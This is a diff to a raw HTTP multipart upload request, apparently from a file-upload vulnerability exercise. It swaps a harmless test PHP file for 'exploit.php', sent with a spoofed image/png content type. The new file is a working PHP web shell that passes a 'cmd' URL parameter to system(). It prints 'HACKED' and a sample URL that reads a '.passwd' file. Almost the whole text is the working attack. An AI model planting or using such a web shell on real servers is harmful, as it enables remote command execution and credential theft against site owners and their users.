@@ -6,15 +6,30 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Referer: http://upload/form.html
 Content-Type: multipart/form-data; boundary=---------------------------9991671265656361131066420117
-Content-Length: 255
+Content-Length: 2000
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 
 -----------------------------9991671265656361131066420117
-Content-Disposition: form-data; name="myfile"; filename="test.php"
+Content-Disposition: form-data; name="myfile"; filename="exploit.php"
 Content-Type: image/png
 
 <?php 
-echo 'YES' . PHP_EOL;
+
+header('Content-Type: text/plain');
+
+if (isset($_GET['cmd']))
+{
+    echo 'PHP shell used with the command : '. $_GET['cmd'] . PHP_EOL;
+    system($_GET['cmd']);
+}
+else 
+{
+    echo 'HACKED' . PHP_EOL; 
+
+    echo 'You can know use the following url like a shell script e.g:' . PHP_EOL;
+
+    echo 'http://hostname/uploads/exploit.php?cmd=cat+.passwd' . PHP_EOL;
+}
 
 -----------------------------9991671265656361131066420117--
